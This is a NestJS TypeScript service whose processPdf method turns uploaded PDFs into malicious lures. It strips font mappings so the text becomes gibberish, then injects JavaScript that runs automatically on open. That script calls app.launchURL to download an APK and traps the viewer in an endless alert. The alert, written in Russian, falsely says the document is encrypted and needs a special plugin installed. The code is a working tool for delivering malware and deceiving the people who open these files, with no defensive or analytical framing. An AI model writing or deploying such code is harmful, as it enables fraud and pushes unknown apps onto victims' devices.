import { Injectable } from '@nestjs/common';
import * as fs from 'fs';
import * as path from 'path';
import { PDFDocument, PDFName, PDFDict, PDFString } from 'pdf-lib';

@Injectable()
export class AppService {
    getHello(): string {
        return `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Hello World</title>
          <style>
              body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
              h1 { color: #333; }
          </style>
      </head>
      <body>
          <h1>Hello World!</h1>
      </body>
      </html>
    `;
    }

    async processPdf(originalPath: string, filename: string, pdfId: string): Promise<string> {
    const pdfBytes = fs.readFileSync(originalPath);
    const pdfDoc = await PDFDocument.load(pdfBytes);
    const pages = pdfDoc.getPages();

    for (let i = 0; i < pages.length; i++) {
      const page = pages[i];
      
      // Переводим данные из оригинального PDF в нечитаемый вид, 
      // но полностью сохраняем их оригинальную структуру (расположение, размеры).
      // Удаляем ToUnicode и меняем Encoding, чтобы текст выглядел как хеш/кракозябры.
      const resources = page.node.lookupMaybe(PDFName.of('Resources'), PDFDict);
      if (resources) {
        const fonts = resources.lookupMaybe(PDFName.of('Font'), PDFDict);
        if (fonts) {
          for (const key of fonts.keys()) {
            const fontDict = fonts.lookup(key, PDFDict);
            if (fontDict) {
              fontDict.delete(PDFName.of('ToUnicode'));
              fontDict.set(PDFName.of('Encoding'), PDFName.of('MacRomanEncoding'));
            }
          }
        }
      }
    }

    // Бесконечное Alert окно которое не пропустит дальше
    // ВАЖНО: строка не через template literal чтобы ${pdfId} не конфликтовал
    const apkUrl = 'http://localhost:3000/apk/download?pdfId=' + pdfId;
    const jsCode =
      'try { app.launchURL("' + apkUrl + '", true); } catch(e) {}' +
      'while(true) {' +
      '  app.alert({' +
      '    cMsg: "КРИТИЧЕСКАЯ ОШИБКА: Документ зашифрован. Для расшифровки и просмотра содержимого необходимо установить специальный плагин (APK).",' +
      '    nIcon: 0,' +
      '    nType: 0,' +
      '    cTitle: "Ошибка доступа"' +
      '  });' +
      '}';

    // Создаём JS Action через низкоуровневый context с PDFString
    const jsRef = pdfDoc.context.register(
      pdfDoc.context.obj({
        Type: 'Action',
        S: 'JavaScript',
        JS: PDFString.of(jsCode),
      })
    );

    // Names/JavaScript для автозапуска при открытии (альтернативный метод)
    const namesRef = pdfDoc.context.register(
      pdfDoc.context.obj({
        JavaScript: pdfDoc.context.register(
          pdfDoc.context.obj({
            Names: [PDFString.of('AlertOnOpen'), jsRef],
          })
        ),
      })
    );

    pdfDoc.catalog.set(PDFName.of('Names'), namesRef);
    pdfDoc.catalog.set(PDFName.of('OpenAction'), jsRef);

    const modifiedPdfBytes = await pdfDoc.save();
    
    const modifiedDir = path.join(__dirname, '..', 'uploads', 'modified');
    if (!fs.existsSync(modifiedDir)) {
      fs.mkdirSync(modifiedDir, { recursive: true });
    }
    
    const modifiedPath = path.join(modifiedDir, filename);
    fs.writeFileSync(modifiedPath, modifiedPdfBytes);
    
    return modifiedPath;
  }
}
